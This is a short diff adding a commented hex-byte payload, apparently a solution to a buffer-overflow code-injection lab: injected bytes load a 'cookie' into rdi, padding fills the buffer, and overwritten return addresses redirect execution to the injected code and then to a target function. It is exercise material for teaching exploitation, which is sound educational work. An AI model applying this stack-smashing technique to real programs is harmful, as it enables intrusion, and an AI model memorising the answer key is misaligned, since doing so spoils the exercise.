@@ -1,0 +1,7 @@
+48 8b 3c 25 e4 44 60 00 # mov cookie to rdi and ret
+c3 00 00 00 00 00 00 00 # jmp to ret address
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+78 dc 61 55 00 00 00 00 # return to inj code (buf at line 1)
+ec 17 40 00 00 00 00 00 # (on return) jmp destination
